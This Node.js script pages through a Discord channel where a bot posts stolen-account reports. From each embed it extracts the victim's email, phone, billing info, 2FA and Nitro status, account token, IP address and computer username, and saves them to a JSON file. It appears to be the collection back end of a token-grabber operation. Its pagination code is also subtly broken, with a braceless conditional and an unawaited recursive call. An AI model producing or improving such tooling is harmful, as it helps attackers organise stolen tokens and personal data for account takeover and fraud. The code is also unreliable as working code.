import 'dotenv/config'
import {get} from './requests.js'
import fs from 'fs';

const CHANNEL_ID = process.env.CHANNEL_ID

const delay = ms => new Promise(res => setTimeout(res, ms));

const getMessagesAfterId = async (messageId, callback) => {
    const messages = await get(`channels/${CHANNEL_ID}/messages?before=${messageId}&limit=50`)

    messages.forEach(callback)
    if (messages.length === 50)
        await delay(500)
        getMessagesAfterId(messages[0].id, callback)
}

const getMessages = async (callback) => {
    const messages = await get(`channels/${CHANNEL_ID}/messages?limit=50`);

    messages.forEach(callback)
    if (messages.length === 50) {
        await delay(500)
        getMessagesAfterId(messages[0].id, callback)
    }
}

(async () => {
    if (!fs.existsSync(CHANNEL_ID))
        fs.mkdirSync(CHANNEL_ID);
    const stream = fs.createWriteStream(`./${CHANNEL_ID}/${Date.now()}.json`)

    stream.write('[')
    const onMessage = (message) => {
        const {author, embeds} = message
        try {
            if (author.bot !== true || embeds?.[0] === undefined) return

            const embed = embeds[0]

            let [email, phone, billingInfo,] = embed.fields[0].value.split('\n').map(e => e.split(': ')[1])
            if (phone.search('invalide') !== -1)
                phone = undefined
            if (billingInfo.search('invalide') !== -1)
                billingInfo = undefined

            let [ip, user,] = embed.fields[1].value.split('\n').map(e => e.split(' ')[1])

            let [nitro, auth2FA,] = embed.fields[2].value.split('\n').map(e => e.split(' ')[1])
            if (nitro.search('invalide') !== -1)
                nitro = false
            if (auth2FA.search('invalide') !== -1)
                auth2FA = false

            let token = embed.fields[3].value
            token = token.slice(2, token.length -2)

            let name = embed.author.name
            let pp = embed.author.icon_url

            const info = {
                discord: {
                    name: name,
                    pp: pp,
                    email: email,
                    phone: phone,
                    billingInfo: billingInfo,
                    nitro: nitro,
                    auth2FA: auth2FA,
                    token: token,
                },
                computer: {
                    ip: ip,
                    user: user
                },
                message: JSON.stringify(message)
            }
            stream.write(JSON.stringify(info, null, 2) + ',\n')
        } catch {
            stream.write(JSON.stringify({discord: null, message: JSON.stringify(message)}))
        }
    }
    await getMessages(onMessage);
    stream.write(']')
})()